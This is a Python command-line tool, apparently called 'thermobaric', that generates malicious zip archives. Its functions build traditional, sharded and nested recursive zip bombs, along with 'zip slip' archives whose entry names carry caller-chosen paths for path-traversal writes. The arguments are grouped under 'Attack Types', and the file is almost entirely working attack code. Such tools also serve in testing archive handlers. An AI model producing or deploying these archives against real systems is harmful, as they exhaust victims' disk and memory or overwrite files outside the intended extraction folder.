
import zipfile as z
import argparse
import logging
from os import remove
from datetime import datetime

# setup logging info
logger = logging.getLogger("util")
logging.basicConfig(level=logging.INFO, handlers=[
                        logging.FileHandler(f"thermobaric-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
                        logging.StreamHandler()
                    ], format="%(asctime)s || %(levelname)s => %(message)s    ")

# Constants:
GB = 1073741824
MB = 1048576
KB = 1024

def print_title() -> None:

    print("💥" + "="*59 + "💥")
    print("""   __  __                              __               _
  / /_/ /_  ___  _________ ___  ____  / /_  ____ ______(_)____
 / __/ __ \/ _ \/ ___/ __ `__ \/ __ \/ __ \/ __ `/ ___/ / ___/
/ /_/ / / /  __/ /  / / / / / / /_/ / /_/ / /_/ / /  / / /__
\__/_/ /_/\___/_/  /_/ /_/ /_/\____/_.___/\__,_/_/  /_/\___/""")
    print("💥" + "="*59 + "💥")

def validate_args(args: argparse.Namespace) -> bool:
    if args.outFile == "":
        logger.error("Outfile must be a valid name")
        return False
    if args.compression > 9:
        logger.error("Compression must be between 1 and 9.")
        return False
    mode = [x for x in (args.t, args.recursive, args.shard, args.slip) if x is True]
    logger.debug(f"validate_args:mode is {mode}")
    if len(mode) > 1:
        logger.error("Cannot have more than one mode selected at a time.")
        logger.debug(f"validate_args: Found {mode}")
        return False
    elif len(mode) == 0:
        logger.error("Select a generation mode")
        return False
    if (args.recursive) and (args.depth > 976):
        logger.error(f"This generation will go over the default recursion limit, set depth below 975")
        return False
    size = [x for x in (args.Sb,args.Sk,args.Sm,args.Sg) if x != 0]
    logger.debug(f"validate_args:size is {size}")
    if len(size) > 1:
        logger.error("Cannot have more than one size modifer at a time.")
        logger.debug(f"Found {size}")
        return False
    elif ((args.slip is True) and (args.slip_file is None)):
        logger.error("Must have file name for slip attack")
        return False
    elif ((len(size) == 0) and (args.slip is False)):
        logger.error("Must have at least one configured size.")
        return False
    return True

def traditional(size: float, name: str, comp=5) -> None:
    logger.info(f"Starting traditional zip generation")
    to_write = b"X" * size
    logger.info(f"Starting material generation of size {len(to_write)} bytes")
    if len(to_write) > 26843545500:
        logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
    with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
        zf.writestr(f"bin-{len(to_write)}.dat", to_write)
        logger.info("Material generation Complete")
        zf.close()
    logger.info(f"Zip file: {name} created")

def shard(size: float, name: str, comp=5, number=5) -> None:
    logger.info(f"Starting sharded zip generation")
    to_write = b"X" * size
    logger.info(f"Starting material generation of size {len(to_write)} bytes")
    if len(to_write) > 26843545500:
        logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
    with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
        logger.info(f"Now generating {number} shards of size {size}")
        for x in range(0, number):
            zf.writestr(f"shard-{x}.dat", to_write)
            logger.debug(f"Wrote shard number {x}")
        zf.close()
    logger.info(f"Zip file: {name} created.")

def recursive(size:float, name:str, comp=5, depth=3, is_first=True):
    logger.debug(f"recursive called: size={size},name={name},comp={comp},depth={depth},if_first={is_first}")
    if depth == 1:
        #write the final zip file and exit
        logger.debug(f"depth is now {depth}")
        with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
            zf.write(f"level-{(depth+1)}.zip")
            zf.close()
        logger.debug(f"level-{depth}.zip wrote to disk!")
        remove(f"level-{(depth+1)}.zip")
        logger.info(f"Finished generating {name}!")
        return
    elif is_first:
        logger.info(f"Starting recursive zip generation")
        # this run will create the file with specified size
        logger.debug(f"Found first run, need to generate file of size {size}")
        with z.ZipFile(f"level-{depth}.zip",'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
            to_write = b"X" * size
            logger.info(f"Starting material generation of size {len(to_write)} bytes")
            if len(to_write) > 26843545500:
                logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
            zf.writestr("data.bin",to_write)
            zf.close()
        logger.debug(f"level-{depth}.zip wrote to disk!")
        recursive(size, name, comp=comp, depth=(depth-1), is_first=False)
    else:
        logger.debug(f"Not first run, depth is now {depth}")
        with z.ZipFile(f"level-{depth}.zip",'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
            zf.write(f"level-{(depth+1)}.zip")
            zf.close()
        logger.debug(f"level-{depth}.zip wrote to disk!")
        logger.debug(f"Now attempting to delete level-{(depth+1)}.zip")
        remove(f"level-{(depth+1)}.zip")
        recursive(size, name, comp=comp, depth=(depth-1), is_first=False)


def slip(zip_name: list, file_name: str,comp=5):
    logger.info(f"Starting zip slip generation")
    # static depth for now. need to figure out dynamic
    with z.ZipFile(zip_name, 'w', compression=z.ZIP_DEFLATED, compresslevel=comp) as zf:
        for name in file_name:
            zf.writestr(name, "")
        zf.close()
    logger.info(f"Generated zip file: {zip_name}")
        

def main(args):
    logger.debug(f"found args: {args}")
    if ( validate_args(args) ):
        if args.t:
            # need better way to handle size args
            if args.Sb:
                traditional(args.Sb, args.outFile, args.compression)
            elif args.Sk:
                traditional((args.Sk * KB), args.outFile, args.compression)
            elif args.Sm:
                traditional((args.Sm * MB), args.outFile, args.compression)
            else:
                traditional((args.Sg * GB), args.outFile, args.compression)
        elif args.shard:
            if args.Sb:
                shard(args.Sb, args.outFile, args.compression, args.shard_num)
            elif args.Sk:
                shard((args.Sk * KB), args.outFile, args.compression, args.shard_num)
            elif args.Sm:
                shard((args.Sm * MB), args.outFile, args.compression, args.shard_num)
            else:
                shard((args.Sg * GB), args.outFile, args.compression, args.shard_num)
        elif args.recursive:
            if args.Sb:
                recursive(args.Sb, args.outFile, args.compression, args.depth)
            elif args.Sk:
                recursive((args.Sk * KB), args.outFile, args.compression, args.depth)
            elif args.Sm:
                recursive((args.Sm * MB), args.outFile, args.compression, args.depth)
            else:
                recursive((args.Sg * GB), args.outFile, args.compression, args.depth)
        elif args.slip:
            slip(args.outFile, args.slip_file, args.compression)
        else:
            print("SOMETHING WENT WRONG")
            exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    attacks = parser.add_argument_group(title="Attack Types", description="Various attack types supported by this tool")
    file_manip = parser.add_argument_group(title="File Modifiers", description="Arguments to modify file structures")
    size_manip = parser.add_argument_group(title="Size Modifiers", description="File size of compressed files.")
    attacks.add_argument("-r","--recursive", help="Generate recursive zip bomb", action="store_true")
    attacks.add_argument("-s","--slip",help="Generate Zip Slip", action='store_true')
    attacks.add_argument('-sf','--slip-file',action='extend',nargs='*',help="slip file name to store, can provide multiple names")
    attacks.add_argument("-x","--shard", help="Generate Sharded zip bomb",action='store_true')
    attacks.add_argument("-xn","--shard-num",help="Number of shards to create", type=int)
    # need to add zip slip attack using symlinks
    attacks.add_argument("-t", help="traditional zip bomb",action='store_true')
    size_manip.add_argument('-Sb', help="file size to compress in bytes", type=int,default=0)
    size_manip.add_argument('-Sk',help="file size to compress in kilobytes", type=int,default=0)
    size_manip.add_argument('-Sm',help="file size to compress in megabytes", type=int,default=0)
    size_manip.add_argument('-Sg',help="file size to compress in gigabytes", type=int,default=0)
    file_manip.add_argument('-c', '--compression', help='Compression level.',type=int,default=1)
    file_manip.add_argument("-f","--outFile",help="Final output filename", type=str, required=True)
    file_manip.add_argument("-d","--depth", help="depth of recursion", type=int)
    print_title()
    args = parser.parse_args()
    main(args)
